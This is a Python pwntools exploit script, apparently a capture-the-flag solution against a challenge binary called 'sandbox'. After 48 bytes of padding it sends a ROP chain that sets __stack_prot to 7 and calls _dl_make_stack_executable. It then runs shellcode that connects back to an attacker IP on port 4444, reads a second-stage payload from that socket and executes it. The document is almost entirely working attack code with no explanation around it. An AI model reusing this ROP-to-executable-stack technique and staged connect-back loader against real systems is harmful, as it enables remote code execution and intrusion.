#!/usr/bin/env python
from pwn import *
import sys

HOST = 'sandbox.chung96vn.cf'
PORT = 1337

def info(s):
	log.info(s)

def exploit(p):
	# 0x0000000000400686 : pop rdi ; ret
	# 0x00000000004100d3 : pop rsi ; ret
	# 0x00000000004492f5 : pop rdx ; ret
	# 0x00000000004150d4 : pop rax ; ret


	bss=0x00000000006BB2E0
	main=0x400B4e
	
	rdi=0x0000000000400686
	rsi=0x00000000004100d3
	rdx=0x00000000004492f5
	rax=0x00000000004150d4

	# 0x000000000044a1d1 : call rsp
	callrsp=0x000000000044a1d1
	_dl_make_stack_executable=0x47F780
	stack_prot=0x6B8EF0
	libc_stack_end=0x6B8AB0
	# 0x0000000000417e08 : mov dword ptr [rdx], eax ; ret
	movedxeax=0x0000000000417e08
	payload = 'a'*48						# padding
	payload += p64(bss+0x30)				# rbp
	payload += p64(rdx)
	payload += p64(stack_prot)
	payload += p64(rax)
	payload += p64(7)
	payload += p64(movedxeax)
	payload += p64(rdi)
	payload += p64(libc_stack_end)
	payload += p64(_dl_make_stack_executable) # call _dl_make_stack_executable(libc_stack_end) with stack_prot=7 : rwx
	payload += p64(callrsp)						# execute shellcode
	context.clear(arch="amd64")
	# connect to my ip with port 4444
	payload += asm(shellcraft.amd64.linux.connect('ip',4444,network='ipv4'))	
	# make address rwx
	payload += asm(shellcraft.amd64.linux.syscall('SYS_mmap', 0x40000, 0x2000, 0x7, 0x22, -1, 0))
	# wait for input from socket
	# when stdin close, my socket fd will = 0
	payload += asm(shellcraft.amd64.linux.read(fd=0, buffer='rsp', count=0x500))
	# excute shellcode receive from socket
	payload += asm("call rsp")
	
	info("len payload = 0x%x"%len(payload))
	p.sendline(payload)
	
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		# p=process(['./sandbox','./program'])
		p=process('./program')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
